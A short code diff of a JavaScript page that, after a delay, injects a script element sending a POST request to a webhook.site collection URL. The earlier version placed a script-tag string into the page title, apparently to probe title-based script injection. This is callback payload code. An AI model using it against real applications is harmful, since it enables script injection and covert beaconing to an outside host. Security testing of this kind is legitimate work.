@@ -17,7 +17,7 @@
             });
         }
 
-        // Function to create the script tag with a POST request
+        // Function to create a script tag with a POST request
         function createScriptWithPostRequest() {
             var method = "POST";
             var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
@@ -29,16 +29,13 @@
             };
 
             var requestString = stringifyRequest(method, url, body, headers);
-
-            // Construct the script tag with the POST request code
-            var scriptTagContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
-            var scriptTag = '<script>' + scriptTagContent + '</script>';
-
-            // Set the title to the script tag
-            document.title = scriptTag;
+            var scriptTag = document.createElement('script');
+            scriptTag.textContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
+            document.head.appendChild(scriptTag);
+            document.title = requestString;
         }
 
-        // Wait for 3 seconds and then set the title to the script tag with the POST request
+        // Wait for 3 seconds and then create the script tag with the POST request
         setTimeout(function () {
             createScriptWithPostRequest();
         }, 3000);
